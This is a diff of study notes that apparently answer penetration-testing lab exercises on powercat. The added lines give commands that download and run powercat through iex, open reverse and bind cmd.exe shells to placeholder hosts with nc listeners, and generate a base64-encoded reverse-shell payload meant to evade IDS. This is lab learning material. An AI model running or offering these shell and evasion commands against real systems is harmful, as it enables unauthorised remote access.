@@ -41,8 +41,26 @@ run dot-sourcing script
 `. .\powercat.ps1`
 or use iex cmdlet
 `iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')`
-
+start listener on local machine
+`nc -lnvp 9999`
+use powershell on remote machine to connect to listener
+`powercat -c <IP> -p <PORT> -e cmd.exe`
+![[Pasted image 20220218171345.png]]
+![[Pasted image 20220218171401.png]]
 2.  Use **PowerShell** and **powercat** to create a bind shell on your Windows system and connect to it from your Kali machine. Can you also use **powercat** to connect to it locally?
-
+create bind shell in powershell with powercat
+`powercat -l -p 443 -e cmd.exe`
+connect with nc on local machine
+`nc -nv <IP> <PORT>`
+to connect locally using powercat simply run powercat with -c flag in seperate terminal
+`powercat -c 127.0.0.1 -p <PORT> `
 
 3.  Use **powercat** to generate an encoded payload and then have it executed through **powershell**. Have a reverse shell sent to your Kali machine, also create an encoded bind shell on your Windows system and use your Kali machine to connect to it.
+generate powercat payload
+`powercat -c <IP> -p <PORT> -e cmd.exe -g > reverseshell.ps1`
+or encade in base64 to avoid IDS
+`powercat -c <IP> -p <PORT> -e cmd.exe -ge > encoded_reverseshell.ps1`
+start listener on local machine
+`nc -lnvp <PORT>`
+start reverse shell by running .ps1 file
+`.\reversehell.ps1`
